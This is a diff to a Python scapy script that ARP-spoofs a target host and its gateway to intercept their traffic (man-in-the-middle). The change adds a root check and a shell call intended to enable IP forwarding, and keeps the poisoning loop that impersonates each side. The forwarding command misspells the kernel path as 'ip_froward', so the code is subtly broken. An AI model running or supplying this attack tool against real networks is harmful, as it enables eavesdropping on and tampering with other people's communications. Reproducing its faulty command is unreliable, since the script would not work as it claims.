@@ -1,6 +1,6 @@
 #!/usr/bin/env python
 ############################# [ IMPORTS ] #############################
-import argparse, socket, re, time
+import argparse, socket, re, time, os, subprocess
 from scapy.all import *
 
 ############################# [ FUNCTIONS ] #############################
@@ -72,14 +72,20 @@ tIP = options.target  # Target IP
 gtwIP = options.gtw  # Gateway IP
 
 try:
-    count = 0
-    while True:
-        spoofMAC(tIP, gtwIP)  # Impersonate gtw on target's ARP table
-        spoofMAC(gtwIP, tIP)  # Impersonate target on gtw's ARP table
-        count += 2
-        print(f"\n   [+] Packets sent : {count}")
-        time.sleep(2)
-        
+    #Check if user is root
+    if not os.geteuid()==0:
+        print('\n[-] This script must be run as root!')
+        exit(1)
+    else:
+        subprocess.run(f"echo 1 > /proc/sys/net/ipv4/ip_froward", shell=True)  # Allow forwarding
+        count = 0
+        while True:
+            spoofMAC(tIP, gtwIP)  # Impersonate gtw on target's ARP table
+            spoofMAC(gtwIP, tIP)  # Impersonate target on gtw's ARP table
+            count += 2
+            print(f"\n   [+] Packets sent : {count}")
+            time.sleep(2)
+            
 except KeyboardInterrupt:
     print("\n   [-] Exiting ...")
     restoreMAC(gtwIP, tIP)  # Restore target on gtw's ARP table
